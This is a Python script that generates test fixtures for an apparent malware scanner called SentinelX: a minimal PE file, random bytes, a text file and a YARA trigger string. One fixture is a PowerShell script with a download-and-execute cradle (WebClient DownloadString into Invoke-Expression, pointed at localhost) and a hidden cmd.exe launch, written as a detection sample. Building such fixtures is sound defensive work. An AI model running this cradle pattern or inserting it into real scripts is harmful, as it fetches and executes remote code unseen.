"""Test fixture generator creating benign test samples for SentinelX tests."""

import random
from pathlib import Path


def generate_fixtures(target_dir: Path) -> None:
    """Generate benign synthetic test files for testing SentinelX."""
    target_dir.mkdir(parents=True, exist_ok=True)

    # 1. Clean sample: A benign minimal PE structure
    clean_pe = target_dir / "clean_sample.exe"
    # Create minimal MZ header with benign content
    # Standard DOS Header: 0x4D 0x5A (MZ), followed by 0x3C offset to PE header (0x40)
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    dos_header[0x3C:0x40] = (64).to_bytes(4, byteorder="little")
    pe_sig = b"PE\x00\x00"
    # Basic file header (COFF): machine=0x8664 (x64), 1 section, timestamp, etc.
    coff_header = (
        (0x8664).to_bytes(2, "little")  # x64
        + (1).to_bytes(2, "little")  # 1 section
        + (0).to_bytes(4, "little")  # timestamp
        + (0).to_bytes(4, "little")  # symbol table
        + (0).to_bytes(4, "little")  # number of symbols
        + (240).to_bytes(2, "little")  # size of optional header
        + (0x0002 | 0x0020).to_bytes(
            2, "little"
        )  # characteristics: executable, large address aware
    )
    # Optional header (standard fields)
    opt_header = bytearray(240)
    opt_header[0:2] = (0x020B).to_bytes(2, "little")  # PE32+ (64-bit)
    # Section header (.text)
    sec_header = bytearray(40)
    sec_header[0:5] = b".text"
    sec_header[8:12] = (512).to_bytes(4, "little")  # VirtualSize
    sec_header[12:16] = (0x1000).to_bytes(4, "little")  # VirtualAddress
    sec_header[16:20] = (512).to_bytes(4, "little")  # SizeOfRawData
    sec_header[20:24] = (512).to_bytes(4, "little")  # PointerToRawData
    sec_header[36:40] = (0x60000020).to_bytes(
        4, "little"
    )  # Characteristics: CNT_CODE | MEM_EXECUTE | MEM_READ

    padding = b"\x00" * (512 - len(dos_header + pe_sig + coff_header + opt_header + sec_header))
    code_section = b"\x90" * 512  # NOP padding
    clean_pe.write_bytes(
        dos_header + pe_sig + coff_header + opt_header + sec_header + padding + code_section
    )

    # 2. High entropy sample: Uniformly random bytes (entropy ~ 7.95)
    rng = random.Random(42)
    random_bytes = bytes(rng.getrandbits(8) for _ in range(8192))
    (target_dir / "high_entropy_sample.bin").write_bytes(random_bytes)

    # 3. Suspicious extension / harmless text
    (target_dir / "suspicious_extension.txt").write_text(
        "This is a benign diagnostic text document used for extension scoring tests.\n",
        encoding="utf-8",
    )

    # 4. Test script (.ps1) containing simulated cradle triggers
    script_content = (
        "# Benign SentinelX Test Script\n"
        "Write-Host 'Test Starting'\n"
        "$client = New-Object Net.WebClient\n"
        "$data = $client.DownloadString('http://localhost:8080/test_payload')\n"
        "Invoke-Expression $data\n"
        "Start-Process cmd.exe -WindowStyle Hidden\n"
    )
    (target_dir / "test_script.ps1").write_text(script_content, encoding="utf-8")

    # 5. YARA test trigger sample
    (target_dir / "test_yara_sample.bin").write_text(
        "HEADER_DATA\nSENTINELX_MALWARE_TEST_STRING_9988\nFOOTER_DATA\n",
        encoding="utf-8",
    )


if __name__ == "__main__":
    fixtures_dir = Path(__file__).resolve().parent
    generate_fixtures(fixtures_dir)
    print(f"Test fixtures successfully generated in {fixtures_dir}")
